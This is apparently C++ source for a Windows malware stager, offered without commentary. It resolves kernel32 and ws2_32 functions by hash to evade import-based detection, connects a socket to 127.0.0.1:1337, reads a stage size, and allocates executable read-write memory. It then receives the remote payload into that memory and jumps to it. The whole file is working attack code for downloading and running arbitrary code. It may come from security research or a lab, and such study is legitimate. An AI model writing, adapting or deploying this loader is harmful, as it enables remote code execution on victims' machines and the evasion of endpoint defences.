#include <Windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>

extern "C" FARPROC __fastcall GetModuleAndFunction(long ModuleFunctionHash);
extern "C" HMODULE __fastcall asmLoadLibrary(LPCSTR lpLibFileName, FARPROC funcAddress);
extern "C" int __fastcall asmWSAStartup(int version, LPWSADATA wsadata, FARPROC funcAddress);
extern "C" SOCKET __fastcall asmWSASocketA(FARPROC funcAddress);
extern "C" int __fastcall asmConnect(SOCKET s, long long sockaddr, FARPROC funcAddress);
extern "C" int __fastcall asmRecv(SOCKET s, void* buf, int size, FARPROC funcAddress);
extern "C" LPVOID __fastcall asmVirtualAlloc(FARPROC funcAddress, int stageSize, DWORD flAllocationType, DWORD flProtect);
extern "C" LPVOID __fastcall asmVirtualProtect(void* addr, int stageSize, DWORD flNewProtect, FARPROC funcAddress);

int ss = 0;
WSADATA WSAData;
int stageSize = 0;
int bytesReceived = 0;

int main(int argc, const char* argv[])
{
	FARPROC loadlibrary = GetModuleAndFunction(0x726774c);						 // Utils: asmCalculateModuleFunctionHash(kernel32.dll, LoadLibraryA)
	asmLoadLibrary("ws2_32", loadlibrary);
	FARPROC wsastartup = GetModuleAndFunction(0x6b8029);						 // Utils: asmCalculateModuleFunctionHash(ws2_32.dll, WSAStartup)
	printf("[+] Found WSAStartup function: 0x%x\n", wsastartup);
	FARPROC wsasocketa = GetModuleAndFunction(0xe0df0fea);						 // Utils: asmCalculateModuleFunctionHash(ws2_32.dll, WSASocketA)
	printf("[+] Found WSASocketA function: 0x%x\n", wsasocketa);
	asmWSAStartup(0x0101, &WSAData, wsastartup);
	FARPROC connect = GetModuleAndFunction(0x627739af);							 // Utils: asmCalculateModuleFunctionHash(ws2_32.dll, WSAConnect)
	printf("[+] Found Connect function: 0x%x\n", connect);

	long long sockaddr = 0x0100007F39050002; //127.0.0.1:1337 AF_INET
	ss = asmWSASocketA(wsasocketa);
	printf("[+] Obtained pointer to SOCKET: 0x%x\n", ss);

	asmConnect(ss, sockaddr, connect);
	FARPROC recv = GetModuleAndFunction(0x5fc8d902);							 // Utils: asmCalculateModuleFunctionHash(ws2_32.dll, recv)
	printf("[+] Found Recv function: 0x%x\n", recv);
	asmRecv(ss, &stageSize, 4, recv);
	printf("[+] Obtained stage size: %d\n", stageSize);
	FARPROC virtualAlloc = GetModuleAndFunction(0xe553a458);					 // Utils: asmCalculateModuleFunctionHash(kernel32.dll, VirtualAlloc)
	printf("[+] Found virtualAlloc function: 0x%x\n", virtualAlloc);
	LPVOID addr = asmVirtualAlloc(virtualAlloc, stageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	printf("[+] Allocated Memory for the stage: 0x%x\n", addr);
	LPVOID addrBak = addr;

	do
	{
		bytesReceived = asmRecv(ss, addr, stageSize, recv);
		printf("Bytes received: %d\n", bytesReceived);
		printf("Left: %d\n", stageSize = stageSize - bytesReceived);
		addr = ((char*)addr) + bytesReceived;
	} while (stageSize != 0);

	((void(*)())addrBak)();

	return 0;
}